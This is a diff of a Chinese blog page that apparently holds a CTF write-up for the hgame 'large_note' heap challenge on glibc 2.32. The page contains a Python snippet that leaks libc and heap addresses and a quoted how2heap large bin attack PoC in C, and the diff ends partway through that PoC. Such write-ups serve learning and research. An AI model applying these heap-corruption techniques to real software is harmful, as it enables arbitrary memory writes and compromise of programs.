@@ -230,9 +230,9 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/about/">
               
-              分类
+              关于
               
               
             </a>
@@ -241,9 +241,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/categories/">
               
-              关于
+              分类
               
               
             </a>
@@ -420,250 +420,250 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1 id="LargebinsAttact与TcachebinsPosioning"><a href="#LargebinsAttact与TcachebinsPosioning" class="headerlink" title="LargebinsAttact与TcachebinsPosioning"></a>LargebinsAttact与TcachebinsPosioning</h1><p>复现hgame_week3 - large_note</p>
+        <h1 id="largebinsattact与tcachebinsposioning">LargebinsAttact与TcachebinsPosioning</h1>
+<p>复现hgame_week3 - large_note</p>
 <p>环境 glibc-2.32</p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230622137.png" alt></p>
+<h2 id="题目">题目</h2>
+<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230622137.png"></p>
 <p>看下菜单</p>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230711043.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230711043.png"></p>
 <p>Add-note 限制了malloc大小 0x500 - 0x900</p>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230750205.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230750205.png"></p>
 <p>Delete-note 没有限制</p>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230832483.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230832483.png"></p>
 <p>Edit-note 没有限制</p>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230849531.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230849531.png"></p>
 <p>Show-note 没有限制</p>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230918914.png" alt></p>
-<h2 id><a href="#" class="headerlink" title=" "></a> </h2><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>目标明确打largebin_attack往任意地点写大数。</p>
+<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230918914.png"></p>
+<h2 id="section"></h2>
+<h2 id="解题思路">解题思路</h2>
+<p>目标明确打largebin_attack往任意地点写大数。</p>
 <p>首先通过unsortedbins泄露libc和heap</p>
-<pre><code class="lang-python">add(0,0x728)
-add(1,0x500)
-add(2,0x718)
-add(3,0x500)
-
-delete(0)
-edit(0,b&#39;A&#39;)
-show(0)
-libc.address = revc_addr(r,&#39;main_arena&#39;) - ord(&#39;A&#39;) - 0x1e3c00
-show_addr(&#39;libc.address&#39;,libc.address)
-edit(0,b&#39;\x00&#39;)
-
-delete(2)
-show(2)
-heap_base = revc_addr(r,&#39;heap&#39;,b&#39;\n&#39;,-1) - 0x290
-show_addr(&#39;heap_base&#39;,heap_base)
-
-add(0,0x728)#复原一下
-add(2,0x718) #复原一下
-</code></pre>
-<p>可以考虑改global<em>max_fast或者mp</em>.tcache_bins。首先需要知道这两个地方的偏移。两种方法。</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">0</span>,<span class="bn">0x728</span>)</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">1</span>,<span class="bn">0x500</span>)</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">2</span>,<span class="bn">0x718</span>)</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">3</span>,<span class="bn">0x500</span>)</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">0</span>)</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>edit(<span class="dv">0</span>,<span class="st">b&#39;A&#39;</span>)</span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>show(<span class="dv">0</span>)</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>libc.address <span class="op">=</span> revc_addr(r,<span class="st">&#39;main_arena&#39;</span>) <span class="op">-</span> <span class="bu">ord</span>(<span class="st">&#39;A&#39;</span>) <span class="op">-</span> <span class="bn">0x1e3c00</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>show_addr(<span class="st">&#39;libc.address&#39;</span>,libc.address)</span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>edit(<span class="dv">0</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)</span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">2</span>)</span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>show(<span class="dv">2</span>)</span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>heap_base <span class="op">=</span> revc_addr(r,<span class="st">&#39;heap&#39;</span>,<span class="st">b&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>,<span class="op">-</span><span class="dv">1</span>) <span class="op">-</span> <span class="bn">0x290</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>show_addr(<span class="st">&#39;heap_base&#39;</span>,heap_base)</span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">0</span>,<span class="bn">0x728</span>)<span class="co">#复原一下</span></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">2</span>,<span class="bn">0x718</span>) <span class="co">#复原一下</span></span></code></pre></div>
+<p>可以考虑改global_max_fast或者mp_.tcache_bins。首先需要知道这两个地方的偏移。两种方法。</p>
 <p>方法一利用gdb.debug启动后，使用<code>pwndbg</code>打印地址</p>
-<pre><code class="lang-python"> r = gdb.debug(&#39;./vuln&#39;,&#39;set debug-file-directory ./.debug/&#39;)
-</code></pre>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102231915130.png" alt></p>
-<p>方法二利用gdb.attach启动后，使用<code>pwndbg</code> <code>file</code>命令加载带有<code>debug</code>信息的<code>.so</code>，再打印。可以用glibc-all-in-one里的<code>.so</code></p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a> r <span class="op">=</span> gdb.debug(<span class="st">&#39;./vuln&#39;</span>,<span class="st">&#39;set debug-file-directory ./.debug/&#39;</span>)</span></code></pre></div>
+<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102231915130.png"></p>
+<p>方法二利用gdb.attach启动后，使用<code>pwndbg</code>
+<code>file</code>命令加载带有<code>debug</code>信息的<code>.so</code>，再打印。可以用glibc-all-in-one里的<code>.so</code></p>
 <p>largebin_attack in glibc2.32 可以看how2heap</p>
-<pre><code class="lang-c">#include&lt;stdio.h&gt;
-#include&lt;stdlib.h&gt;
-#include&lt;assert.h&gt;
-
-/*
-
-A revisit to large bin attack for after glibc2.30
-
-Relevant code snippet :
-
-    if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;
-        fwd = bck;
-        bck = bck-&gt;bk;
-        victim-&gt;fd_nextsize = fwd-&gt;fd;
-        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
-        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
-    &#125;
-
-
-*/
-
-int main()&#123;
-  /*Disable IO buffering to prevent stream from interfering with heap*/
-  setvbuf(stdin,NULL,_IONBF,0);
-  setvbuf(stdout,NULL,_IONBF,0);
-  setvbuf(stderr,NULL,_IONBF,0);
-
-  printf(&quot;\n\n&quot;);
-  printf(&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;);
-  printf(&quot;Check 1 : \n&quot;);
-  printf(&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;);
-  printf(&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;);
-  printf(&quot;Check 2 : \n&quot;);
-  printf(&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;);
-  printf(&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;);
-  printf(&quot;This prevents the traditional large bin attack\n&quot;);
-  printf(&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;);
-
-  printf(&quot;====================================================================\n\n&quot;);
-
-  size_t target = 0;
-  printf(&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;,&amp;target,target);
-  size_t *p1 = malloc(0x428);
-  printf(&quot;First, we allocate a large chunk [p1] (%p)\n&quot;,p1-2);
-  size_t *g1 = malloc(0x18);
-  printf(&quot;And another chunk to prevent consolidate\n&quot;);
-
-  printf(&quot;\n&quot;);
-
-  size_t *p2 = malloc(0x418);
-  printf(&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;,p2-2);
-  printf(&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;);
-  size_t *g2 = malloc(0x18);
-  printf(&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;);
-
-  printf(&quot;\n&quot;);
-
-  free(p1);
-  printf(&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;,p1-2);
-  size_t *g3 = malloc(0x438);
-  printf(&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;);
-
-  printf(&quot;\n&quot;);
-
-  free(p2);
-  printf(&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;,p2-2);
-  printf(&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;,p1-2);
-  printf(&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;,p2-2);
-
-  printf(&quot;\n&quot;);
-
-  p1[3] = (size_t)((&amp;target)-4);
-  printf(&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;,(&amp;target)-4);
-
-  printf(&quot;\n&quot;);
-
-  size_t *g4 = malloc(0x438);
-  printf(&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;, p2-2, p2-2);
-  printf(&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;);
-  printf(&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;);
-  printf(&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;, p2-2, p1-2, p2-2);
-
-  printf(&quot;\n&quot;);
-
-  printf(&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;, p2-2, (void *)target);
-  printf(&quot;Target (%p) : %p\n&quot;,&amp;target,(size_t*)target);
-
-  printf(&quot;\n&quot;);
-  printf(&quot;====================================================================\n\n&quot;);
-
-  assert((size_t)(p2-2) == target);
-
-  return 0;
-&#125;
-</code></pre>
+<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;assert.h&gt;</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="co">/*</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="co">A revisit to large bin attack for after glibc2.30</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="co">Relevant code snippet :</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a><span class="co">    if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a><span class="co">        fwd = bck;</span></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a><span class="co">        bck = bck-&gt;bk;</span></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a><span class="co">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a><span class="co">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a><span class="co">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a><span class="co">    &#125;</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a><span class="co">*/</span></span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()&#123;</span></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>  <span class="co">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a>  setvbuf<span class="op">(</span>stdin<span class="op">,</span>NULL<span class="op">,</span>_IONBF<span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a>  setvbuf<span class="op">(</span>stdout<span class="op">,</span>NULL<span class="op">,</span>_IONBF<span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a>  setvbuf<span class="op">(</span>stderr<span class="op">,</span>NULL<span class="op">,</span>_IONBF<span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion</span><span class="sc">\n\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Check 1 : </span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;&gt;        malloc_printerr (</span><span class="sc">\&quot;</span><span class="st">malloc(): largebin double linked list corrupted (nextsize)</span><span class="sc">\&quot;</span><span class="st">);</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-33"><a href="#cb3-33" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Check 2 : </span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-34"><a href="#cb3-34" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;&gt;    if (bck-&gt;fd != fwd)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-35"><a href="#cb3-35" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;&gt;        malloc_printerr (</span><span class="sc">\&quot;</span><span class="st">malloc(): largebin double linked list corrupted (bk)</span><span class="sc">\&quot;</span><span class="st">);</span><span class="sc">\n\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-36"><a href="#cb3-36" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;This prevents the traditional large bin attack</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-37"><a href="#cb3-37" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : </span><span class="sc">\n\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-38"><a href="#cb3-38" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb3-39"><a href="#cb3-39" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;====================================================================</span><span class="sc">\n\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-40"><a href="#cb3-40" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-41"><a href="#cb3-41" aria-hidden="true" tabindex="-1"></a>  <span class="dt">size_t</span> target <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb3-42"><a href="#cb3-42" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Here is the target we want to overwrite (</span><span class="sc">%p</span><span class="st">) : </span><span class="sc">%lu\n\n</span><span class="st">&quot;</span><span class="op">,&amp;</span>target<span class="op">,</span>target<span class="op">);</span></span>
+<span id="cb3-43"><a href="#cb3-43" aria-hidden="true" tabindex="-1"></a>  <span class="dt">size_t</span> <span class="op">*</span>p1 <span class="op">=</span> malloc<span class="op">(</span><span class="bn">0x428</span><span class="op">);</span></span>
+<span id="cb3-44"><a href="#cb3-44" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;First, we allocate a large chunk [p1] (</span><span class="sc">%p</span><span class="st">)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>p1<span class="op">-</span><span class="dv">2</span><span class="op">);</span></span>
+<span id="cb3-45"><a href="#cb3-45" aria-hidden="true" tabindex="-1"></a>  <span class="dt">size_t</span> <span class="op">*</span>g1 <span class="op">=</span> malloc<span class="op">(</span><span class="bn">0x18</span><span class="op">);</span></span>
+<span id="cb3-46"><a href="#cb3-46" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;And another chunk to prevent consolidate</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-47"><a href="#cb3-47" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-48"><a href="#cb3-48" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-49"><a href="#cb3-49" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-50"><a href="#cb3-50" aria-hidden="true" tabindex="-1"></a>  <span class="dt">size_t</span> <span class="op">*</span>p2 <span class="op">=</span> malloc<span class="op">(</span><span class="bn">0x418</span><span class="op">);</span></span>
+<span id="cb3-51"><a href="#cb3-51" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;We also allocate a second large chunk [p2]  (</span><span class="sc">%p</span><span class="st">).</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>p2<span class="op">-</span><span class="dv">2</span><span class="op">);</span></span>
+<span id="cb3-52"><a href="#cb3-52" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;This chunk should be smaller than [p1] and belong to the same large bin.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-53"><a href="#cb3-53" aria-hidden="true" tabindex="-1"></a>  <span class="dt">size_t</span> <span class="op">*</span>g2 <span class="op">=</span> malloc<span class="op">(</span><span class="bn">0x18</span><span class="op">);</span></span>
+<span id="cb3-54"><a href="#cb3-54" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Once again, allocate a guard chunk to prevent consolidate</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-55"><a href="#cb3-55" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-56"><a href="#cb3-56" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-57"><a href="#cb3-57" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-58"><a href="#cb3-58" aria-hidden="true" tabindex="-1"></a>  free<span class="op">(</span>p1<span class="op">);</span></span>
+<span id="cb3-59"><a href="#cb3-59" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Free the larger of the two --&gt; [p1] (</span><span class="sc">%p</span><span class="st">)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>p1<span class="op">-</span><span class="dv">2</span><span class="op">);</span></span>
+<span id="cb3-60"><a href="#cb3-60" aria-hidden="true" tabindex="-1"></a>  <span class="dt">size_t</span> <span class="op">*</span>g3 <span class="op">=</span> malloc<span class="op">(</span><span class="bn">0x438</span><span class="op">);</span></span>
+<span id="cb3-61"><a href="#cb3-61" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-62"><a href="#cb3-62" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-63"><a href="#cb3-63" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-64"><a href="#cb3-64" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-65"><a href="#cb3-65" aria-hidden="true" tabindex="-1"></a>  free<span class="op">(</span>p2<span class="op">);</span></span>
+<span id="cb3-66"><a href="#cb3-66" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Free the smaller of the two --&gt; [p2] (</span><span class="sc">%p</span><span class="st">)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>p2<span class="op">-</span><span class="dv">2</span><span class="op">);</span></span>
+<span id="cb3-67"><a href="#cb3-67" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;At this point, we have one chunk in large bin [p1] (</span><span class="sc">%p</span><span class="st">),</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>p1<span class="op">-</span><span class="dv">2</span><span class="op">);</span></span>
+<span id="cb3-68"><a href="#cb3-68" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;               and one chunk in unsorted bin [p2] (</span><span class="sc">%p</span><span class="st">)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>p2<span class="op">-</span><span class="dv">2</span><span class="op">);</span></span>
+<span id="cb3-69"><a href="#cb3-69" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-70"><a href="#cb3-70" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-71"><a href="#cb3-71" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-72"><a href="#cb3-72" aria-hidden="true" tabindex="-1"></a>  p1<span class="op">[</span><span class="dv">3</span><span class="op">]</span> <span class="op">=</span> <span class="op">(</span><span class="dt">size_t</span><span class="op">)((&amp;</span>target<span class="op">)-</span><span class="dv">4</span><span class="op">);</span></span>
+<span id="cb3-73"><a href="#cb3-73" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (</span><span class="sc">%p</span><span class="st">)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,(&amp;</span>target<span class="op">)-</span><span class="dv">4</span><span class="op">);</span></span>
+<span id="cb3-74"><a href="#cb3-74" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-75"><a href="#cb3-75" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-76"><a href="#cb3-76" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-77"><a href="#cb3-77" aria-hidden="true" tabindex="-1"></a>  <span class="dt">size_t</span> <span class="op">*</span>g4 <span class="op">=</span> malloc<span class="op">(</span><span class="bn">0x438</span><span class="op">);</span></span>
+<span id="cb3-78"><a href="#cb3-78" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Finally, allocate another chunk larger than [p2] (</span><span class="sc">%p</span><span class="st">) to place [p2] (</span><span class="sc">%p</span><span class="st">) into large bin</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> p2<span class="op">-</span><span class="dv">2</span><span class="op">,</span> p2<span class="op">-</span><span class="dv">2</span><span class="op">);</span></span>
+<span id="cb3-79"><a href="#cb3-79" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-80"><a href="#cb3-80" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-81"><a href="#cb3-81" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Upon inserting [p2] (</span><span class="sc">%p</span><span class="st">) into largebin, [p1](</span><span class="sc">%p</span><span class="st">)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (</span><span class="sc">%p</span><span class="st">)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> p2<span class="op">-</span><span class="dv">2</span><span class="op">,</span> p1<span class="op">-</span><span class="dv">2</span><span class="op">,</span> p2<span class="op">-</span><span class="dv">2</span><span class="op">);</span></span>
+<span id="cb3-82"><a href="#cb3-82" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-83"><a href="#cb3-83" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-84"><a href="#cb3-84" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-85"><a href="#cb3-85" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;In out case here, target is now overwritten to address of [p2] (</span><span class="sc">%p</span><span class="st">), [target] (</span><span class="sc">%p</span><span class="st">)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> p2<span class="op">-</span><span class="dv">2</span><span class="op">,</span> <span class="op">(</span><span class="dt">void</span> <span class="op">*)</span>target<span class="op">);</span></span>
